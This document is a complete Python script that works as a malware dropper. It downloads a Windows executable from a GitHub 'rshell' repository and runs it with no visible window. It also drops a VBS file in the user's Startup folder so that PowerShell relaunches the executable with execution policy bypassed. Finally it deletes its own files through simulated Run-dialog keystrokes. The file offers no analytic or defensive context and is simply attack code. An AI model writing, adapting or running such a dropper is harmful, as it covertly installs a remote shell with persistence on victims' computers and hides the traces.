import os
import sys
import time
import psutil
import requests
import keyboard
import subprocess
from maldir import MalDir

win = "https://github.com/pyth0g/rshell/raw/main/main-win.exe"

dir = MalDir.Create().replace("\\", "/")

def download(url, destination):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            with open(destination, 'wb') as f:
                f.write(response.content)
        return True
    except:
        return True

def terminate(process_name):
    for proc in psutil.process_iter():
        if proc.name() == process_name:
            proc.terminate()
            break

def log(msg):
    os.system(f"echo {msg} & pause")

def delete(exe_path, py_path):
    exe = os.path.basename(sys.argv[0].replace("py", "exe"))
    py = os.path.basename(sys.argv[0])

    keyboard.send("windows+r")
    time.sleep(0.3)
    keyboard.write("cmd.exe\n")
    time.sleep(0.3)
    keyboard.write(f'timeout 1 & del {exe_path} & del {py_path} & exit\n')

    terminate(exe)
    terminate(py)

def startup():
    win_exe_path = f"{dir}/win.exe"
    win_ps1_content = f'Start-Process -WindowStyle Hidden -FilePath "{win_exe_path}"'
    with open(f"{dir}/win.ps1", "w") as f:
        f.write(win_ps1_content)

    win_vbs_content = (
        'Set objShell = CreateObject("WScript.Shell")\n'
        f'objShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""{dir}/win.ps1""", 0, True'
    )
    startup_folder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/win.vbs"
    with open(startup_folder, "w") as f:
        f.write(win_vbs_content)

def execute():
    subprocess.Popen([f"{dir}/win.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
    return True

def main():
    download(win, f"{dir}/win.exe")
    execute()
    startup()
    delete(sys.argv[0].replace("py", "exe"),__file__)

main()